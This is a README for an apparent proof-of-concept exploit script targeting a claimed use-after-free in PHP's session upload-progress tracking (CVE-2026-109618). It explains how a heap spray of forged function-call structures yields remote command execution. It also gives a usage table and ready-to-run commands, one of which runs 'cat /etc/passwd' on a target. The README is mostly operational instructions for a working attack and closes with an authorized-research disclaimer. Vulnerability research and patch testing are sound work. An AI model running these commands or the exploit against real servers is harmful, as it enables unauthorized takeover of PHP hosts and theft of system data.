# Proof of Concept: CVE-2026-109618 (php2shell)

This directory contains the Proof of Concept (PoC) exploit script demonstrating the **Heap Use-After-Free (UAF)** condition in PHP's RFC 1867 session upload progress tracking mechanism ([`exploit.py`](exploit.py), legacy alias: [`poc_109618.py`](poc_109618.py)).

---

## Technical Overview

The exploit leverages an architectural flaw in PHP core (`ext/session/session.c`):
1. **First Phase (`phase1`):** Submits initial multipart form-data payload with `PHP_SESSION_UPLOAD_PROGRESS`. PHP initialises tracking and caches raw `zval *` bucket pointers (`post_bytes_processed`).
2. **Frequency Window Stall (`--stall`):** Pauses for slightly longer than `session.upload_progress.min_freq` (default: 1.0s) so the subsequent upload chunk forces a session progress update.
3. **Destruction & Reclamation:** `zend_hash_update()` destroys the previous data tree, triggering `zval_ptr_dtor` which frees the memory. The script immediately sprays 149 packed table entries (`t[]`) to reclaim the 320-byte bin with forged `zend_fcall_info` structures.
4. **Execution:** Stale pointer write invokes `zend_call_function()`, executing the specified system command.

---

## Requirements

- Python 3.8+ (no third-party packages required, standard library only).

---

## Usage Syntax

```bash
python3 poc/exploit.py [TARGET_URL] [OPTIONS]
```

### Options & Flags

| Flag | Default | Description |
| :--- | :--- | :--- |
| `url` | `http://127.0.0.1:80/index.php` | Target URL pointing to any reachable PHP script |
| `--command` | `uname -a; id; echo JACKALPOC` | System command to execute on target |
| `--sid` | Random string | Session identifier to pass via `PHPSESSID` |
| `--stall` | `1.35` | Delay in seconds between phase 1 and spray tail |
| `--dtor` | `0` | Leaked `zval_ptr_dtor` address (call = `dtor - 0x43EF0`) |
| `--call` | `""` | Direct override address for `zend_call_function` |
| `--dry` | `False` | Write forged payload to `body-109618.bin` without sending |

### Examples

**1. Dry-run payload generation:**
```bash
python3 poc/exploit.py http://127.0.0.1:8080/index.php --dry
```

**2. Target attack against local lab with custom command:**
```bash
python3 poc/exploit.py http://192.168.1.50/index.php --command "id; whoami; cat /etc/passwd"
```

**3. Providing leaked memory offset for specific distribution:**
```bash
python3 poc/exploit.py https://target.lab/app.php --dtor 0x7ffff7a43ef0 --stall 1.5
```

---

## Disclaimer

This exploit script is provided for authorized security research, vulnerability testing, and educational purposes only. Unauthorized testing of systems without explicit prior permission is illegal.
